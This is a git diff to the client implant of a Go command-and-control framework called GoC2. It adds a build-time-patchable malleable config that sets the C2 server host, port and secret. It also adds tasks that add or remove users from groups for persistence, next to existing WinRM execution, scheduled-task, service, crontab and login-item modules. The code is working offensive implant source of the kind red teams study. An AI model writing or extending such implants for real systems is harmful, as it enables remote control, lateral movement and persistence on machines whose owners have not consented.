@@ -57,6 +57,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scanner"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scheduledtasks"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/services"
+	"github.com/latortuga71/GoC2/internal/modules/persistence/addusertogroup"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/crontab"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/launchitems"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/loginitems"
@@ -75,6 +76,13 @@ var CheckedIn bool
 var ClientDone chan interface{}
 var ClientInterrupt chan os.Signal
 var Client *data.Client
+
+//const ServerHostName = []string{"192.168.56.1",}
+// 192.168.56.1 80 test
+
+// config is 500 bytes long.
+// MALLEABLE
+var MalleableConfig string = "TURTLEMALLEABLEZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
 var ServerHostName string
 var ServerPort string
 var ServerSecret string
@@ -85,9 +93,25 @@ var clientKey string
 var caCert string
 
 func init() {
-	ServerHostName = "192.168.56.1"
-	ServerPort = "80"
-	ServerSecret = "test"
+	// malleable
+	config := data.Config{}
+	// read until the nulls
+	var jsonData []byte
+	for x := 0; x < len(MalleableConfig); x++ {
+		if byte(MalleableConfig[x]) == 0x00 {
+			break
+		} else {
+			jsonData = append(jsonData, MalleableConfig[x])
+		}
+	}
+	err := json.Unmarshal(jsonData, &config)
+	if err != nil {
+		log.Fatal(err)
+	}
+	ServerHostName = config.ServerHostName
+	ServerPort = config.ServerPort
+	ServerSecret = config.ServerSecret
+	// malleable
 	CheckedIn = false
 	CheckedInChan = make(chan interface{})
 	ClientDone = make(chan interface{})          // Channel to indicate that the receiverHandler is done
@@ -355,6 +379,10 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "winrm-exec":
 		result, cmdError = exectools.WinRmExec(t.Args)
 		exectools.ResetResults()
+	case "add-user":
+		result, cmdError = addusertogroup.AddUserToGroup(t.Args)
+	case "remove-user":
+		result, cmdError = addusertogroup.RemoveUserFromGroup(t.Args)
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
